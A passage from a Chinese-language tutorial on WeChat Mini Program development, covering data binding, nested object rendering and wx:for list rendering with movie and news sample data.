value来定义，属性由逗号,分隔</li><li><strong>数组Array</strong>，结合之前所学，我们再来回顾一下：数组由中括号[ ]来分割，有点类似于列表；</li></ul><h3 id="0x003-组件属性的渲染"><a href="#0x003-组件属性的渲染" class="headerlink" title="0x003 组件属性的渲染"></a>0x003 组件属性的渲染</h3><p>通过数据绑定，我们还可以把 style、class 、id等属性分离出来来控制组件的样式等信息。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">navigator</span> <span class="attr">id</span>=<span class="string">&quot;item-&#123;&#123;id&#125;&#125;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;&#123;&#123;itemclass&#125;&#125;&quot;</span> <span class="attr">url</span>=<span class="string">&quot;&#123;&#123;itemurl&#125;&#125;&quot;</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">image</span> <span class="attr">style</span>=<span class="string">&quot;width: &#123;&#123;imagewidth&#125;&#125;&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;&#123;&#123;imagemode&#125;&#125;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;imagesrc&#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="number">233</span>,</span><br><span class="line">  <span class="attr">itemurl</span>:<span class="string">&quot;/pages/home/imgshow/imgshow&quot;</span>,</span><br><span class="line">  <span class="attr">itemclass</span>:<span class="string">&quot;event-item&quot;</span>,</span><br><span class="line">  <span class="attr">imagesrc</span>: <span class="string">&quot;https://hackwork.oss-cn-shanghai.aliyuncs.com/lesson/weapp/4/weapp.jpg&quot;</span>,</span><br><span class="line">  <span class="attr">imagemode</span>:<span class="string">&quot;widthFix&quot;</span>,</span><br><span class="line">  <span class="attr">imagewidth</span>:<span class="string">&quot;100%&quot;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>在模拟器里查看显示的效果，发现显示的结果上和之前不采用数据绑定没有什么区别，<em><strong>但是用数据绑定的好处是为我们以后添加大量数据以及进行编程更新打下了基础。</strong></em></p><h3 id="0x004-渲染数组里的单条数据"><a href="#0x004-渲染数组里的单条数据" class="headerlink" title="0x004 渲染数组里的单条数据"></a>0x004 渲染数组里的单条数据</h3><p>格式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;newstitle[0]&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">   <span class="attr">newstitle</span>:[</span><br><span class="line">     </span><br><span class="line">   ],</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="0x005-渲染对象类型的数据"><a href="#0x005-渲染对象类型的数据" class="headerlink" title="0x005 渲染对象类型的数据"></a>0x005 渲染对象类型的数据</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;movie.img&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:300rpx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>电影名：&#123;&#123;movie.name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>英文名：&#123;&#123;movie.englishname&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>国家：&#123;&#123;movie.country&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>发行年份：&#123;&#123;movie.year&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>简述：&#123;&#123;movie.desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">movie</span>: &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;肖申克的救赎&quot;</span>,</span><br><span class="line">      <span class="attr">englishname</span>:<span class="string">&quot;The Shawshank Redemption&quot;</span>,</span><br><span class="line">      <span class="attr">country</span>:<span class="string">&quot;美国&quot;</span>,</span><br><span class="line">      <span class="attr">year</span>:<span class="number">1994</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;有的人的羽翼是如此光辉，即使世界上最黑暗的牢狱，也无法长久地将他围困！&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象Object类型的数据就被渲染出来:在双大括号&#123;&#123;&#125;&#125;里，输入变量movie+点+属性名即可，这就是**对象的点表示法**。</span><br></pre></td></tr></table></figure><h3 id="0x006-复杂的数据嵌套"><a href="#0x006-复杂的数据嵌套" class="headerlink" title="0x006 复杂的数据嵌套"></a>0x006 复杂的数据嵌套</h3><p>对象是可以嵌套的，也就是一个对象可以作为另外一个对象的值，除了对象里套对象，数组里也可以套对象，对象里也可以套数组。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">movies</span>:[</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">name</span>: <span class="string">&quot;肖申克的救赎&quot;</span>,</span><br><span class="line">       <span class="attr">englishname</span>: <span class="string">&quot;The Shawshank Redemption&quot;</span>,</span><br><span class="line">       <span class="attr">country</span>: <span class="string">&quot;美国&quot;</span>,</span><br><span class="line">       <span class="attr">year</span>: <span class="number">1994</span>,</span><br><span class="line">       <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span>,</span><br><span class="line">       <span class="attr">desc</span>: <span class="string">&quot;有的人的羽翼是如此光辉，即使世界上最黑暗的牢狱，也无法长久地将他围困！&quot;</span>,</span><br><span class="line">       <span class="attr">actor</span>:[</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>:<span class="string">&quot;蒂姆·罗宾斯&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>:<span class="string">&quot;安迪·杜佛兰&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>:<span class="string">&quot;摩根·弗里曼&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>:<span class="string">&quot;艾利斯·波伊德·瑞德&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">       ]</span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,</span><br><span class="line">       <span class="attr">englishname</span>: <span class="string">&quot;Farewell My Concubine&quot;</span>,</span><br><span class="line">       <span class="attr">country</span>: <span class="string">&quot;中国&quot;</span>,</span><br><span class="line">       <span class="attr">year</span>: <span class="number">1993</span>,</span><br><span class="line">       <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p2561716440.webp&quot;</span>,</span><br><span class="line">       <span class="attr">desc</span>: <span class="string">&quot;风华绝代&quot;</span>,</span><br><span class="line">       <span class="attr">actor</span>: [</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>: <span class="string">&quot;张国荣&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>: <span class="string">&quot;程蝶衣&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         &#123;</span><br><span class="line">           <span class="attr">name</span>: <span class="string">&quot;张丰毅&quot;</span>,</span><br><span class="line">           <span class="attr">role</span>: <span class="string">&quot;段小楼&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">       ]</span><br><span class="line">     &#125;,</span><br><span class="line">   ],</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>豆瓣电影排名第2、最重要的主演演员名：<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>&#123;&#123;movies[1].actor[0].name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>显示即可出现我们想要的结果</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;movies[1].img&#125;&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:300rpx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>电影名：&#123;&#123;movies[1].name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>英文名：&#123;&#123;movies[1].englishname&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>发行地：&#123;&#123;movies[1].country&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>发行年份：&#123;&#123;movies[1].year&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span>简述：&#123;&#123;movies[1].desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将第二部电影的数据全部渲染</p><p>以上适用于电影或者新闻列表渲染</p><h2 id="0x06-列表渲染与条件渲染"><a href="#0x06-列表渲染与条件渲染" class="headerlink" title="0x06 列表渲染与条件渲染"></a>0x06 列表渲染与条件渲染</h2><h3 id="0x001-渲染数组里的所有数据"><a href="#0x001-渲染数组里的所有数据" class="headerlink" title="0x001 渲染数组里的所有数据"></a>0x001 渲染数组里的所有数据</h3><p><strong>相同的结构是列表渲染的前提</strong></p><p>在实际的开发场景里，商品、新闻、股票、收藏、书架列表等都会有几千上万条的数据，他们都有一个共同的特征就是数据的结构相同，这也是可以批量化渲染的前提。</p><p>Eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">newstitle</span>:[</span><br><span class="line">      <span class="string">&quot;瑞幸咖啡：有望在三季度达到门店运营的盈亏平衡点&quot;</span>,</span><br><span class="line">      <span class="string">&quot;腾讯：广告高库存量还是会持续到下一年&quot;</span>,</span><br><span class="line">      <span class="string">&quot;上汽集团云计算数据中心落户郑州，总投资20亿元&quot;</span>,</span><br><span class="line">      <span class="string">&quot;京东：月收入超2万元快递小哥数量同比增长163%&quot;</span>,</span><br><span class="line">      <span class="string">&quot;腾讯：《和平精英》日活跃用户已超五千万&quot;</span>,</span><br><span class="line">    ],</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>将上述数据全部渲染出来</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;newstitle&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;item&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里wx:for&#x3D;””，也就是在数组newstitle里进行循环，*this代表在 for 循环中的 item 本身，而的item是默认的。也可以使用如下方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for-items</span>=<span class="string">&quot;&#123;&#123;newstitle&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;title&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x002-wx-for"><a href="#0x002-wx-for" class="headerlink" title="0x002 wx:for"></a>0x002 wx:for</h3><p>在组件上使用 <code>wx:for</code> 控制属性绑定一个数组，即可使用数组中各项的数据重复渲染该组件。</p><p>默认数组的当前项的下标变量名默认为 <code>index</code>，数组当前项的变量名默认为 <code>item</code></p><p>使用 <code>wx:for-item</code> 可以指定数组当前元素的变量名，</p><p>使用 <code>wx:for-index</code> 可以指定数组当前下标的变量名：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;array&#125;&#125;&quot;</span> <span class="attr">wx:for-index</span>=<span class="string">&quot;idx&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;itemName&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;idx&#125;&#125;: &#123;&#123;itemName.message&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>wx:for</code> 也可以嵌套，下边是一个九九乘法表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;i&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;[1, 2, 3, 4, 5, 6, 7, 8, 9]&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;j&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:if</span>=<span class="string">&quot;&#123;&#123;i &lt;= j&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123;i&#125;&#125; * &#123;&#123;j&#125;&#125; = &#123;&#123;i * j&#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x003-block-wx-for"><a href="#0x003-block-wx-for" class="headerlink" title="0x003 block wx:for"></a>0x003 block wx:for</h3><p>类似 <code>block wx:if</code>，也可以将 <code>wx:for</code> 用在&#96;&#96;标签上，以渲染一个包含多节点的结构块。例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;[1, 2, 3]&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span> &#123;&#123;index&#125;&#125;: <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">view</span>&gt;</span> &#123;&#123;item&#125;&#125; <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">block</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x004-wx-key"><a href="#0x004-wx-key" class="headerlink" title="0x004 wx:key"></a>0x004 wx:key</h3><p>如果列表中项目的位置会动态改变或者有新的项目添加到列表中，并且希望列表中的项目保持自己的特征和状态（如 <a href="https://developers.weixin.qq.com/miniprogram/dev/component/input.html">input</a> 中的输入内容，<a href="https://developers.weixin.qq.com/miniprogram/dev/component/switch.html">switch</a> 的选中状态），需要使用 <code>wx:key</code> 来指定列表中项目的唯一的标识符。</p><p><code>wx:key</code> 的值以两种形式提供</p><ol><li>字符串，代表在 for 循环的 array 中 item 的某个 property，该 property 的值需要是列表中唯一的字符串或数字，且不能动态改变。</li><li>保留关键字 <code>*this</code> 代表在 for 循环中的 item 本身，这种表示需要 item 本身是一个唯一的字符串或者数字。</li></ol><p>当数据改变触发渲染层重新渲染的时候，会校正带有 key 的组件，框架会确保他们被重新排序，而不是重新创建，以确保使组件保持自身的状态，并且提高列表渲染时的效率。</p><p><strong>如不提供 <code>wx:key</code>，会报一个 <code>warning</code>， 如果明确知道该列表是静态，或者不必关注其顺序，可以选择忽略。</strong></p><h3 id="0x005-电影列表页面"><a href="#0x005-电影列表页面" class="headerlink" title="0x005 电影列表页面"></a>0x005 电影列表页面</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">movies</span>: [&#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;肖申克的救赎&quot;</span>, </span><br><span class="line">    <span class="attr">img</span>:<span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p480747492.webp&quot;</span>,</span><br><span class="line">    <span class="attr">desc</span>:<span class="string">&quot;有的人的羽翼是如此光辉，即使世界上最黑暗的牢狱，也无法长久地将他围困！&quot;</span>&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;霸王别姬&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1910813120.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;风华绝代。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;这个杀手不太冷&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p511118051.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;怪蜀黍和小萝莉不得不说的故事。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;阿甘正传&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img1.doubanio.com/view/photo/s_ratio_poster/public/p510876377.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;一部美国近现代史。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;美丽人生&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p510861873.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;最美的谎言。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;泰坦尼克号&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p457760035.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;失去的才是永恒的。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;千与千寻&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p1606727862.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;最好的宫崎骏，最好的久石让。&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;辛德勒名单&quot;</span>,</span><br><span class="line">      <span class="attr">img</span>: <span class="string">&quot;https://img3.doubanio.com/view/photo/s_ratio_poster/public/p492406163.webp&quot;</span>,</span><br><span class="line">      <span class="attr">desc</span>: <span class="string">&quot;拯救一个人，就是拯救整个世界。&quot;</span></span><br><span class="line">    &#125;,     </span><br><span class="line">  ],</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page__bd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-panel weui-panel_access&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-panel__bd&quot;</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;movies&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;movies&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*item&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box weui-media-box_appmsg&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;weui-cell_active&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__hd weui-media-box__hd_in-appmsg&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__thumb&quot;</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;movies.img&#125;&#125;&quot;</span> <span class="attr">sytle</span>=<span class="string">&quot;height:auto&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__bd weui-media-box__bd_in-appmsg&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__title&quot;</span>&gt;</span>&#123;&#123;movies.name&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-media-box__desc&quot;</span>&gt;</span>&#123;&#123;movies.desc&#125;&#125;<span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="0x006-Grid九宫格样式参考-适用于界面"><a href="#0x006-Grid九宫格样式参考-适用于界面" class="headerlink" title="0x006 Grid九宫格样式参考(适用于界面)"></a>0x006 Grid九宫格样式参考(适用于界面)</h3><p>一行三列式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;page__bd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;weui-grids&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">block</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;grids&#125;&#125;&quot;</span> <span class="attr">wx:for-item</span>=<span class="string">&quot;grid&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;*this&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">navigator</span> <span class="attr">url</span>=<span class="string">&quot;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;weui-grid&quot;</span> <span class="attr">hover-class</span>=<span class="string">&quot;weui-grid_active&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">image</span> <span class="attr">class</span>=<span class="string">&quot;weui-grid__icon&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;grid.imgurl&#125;&#125;&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">view</span> <span 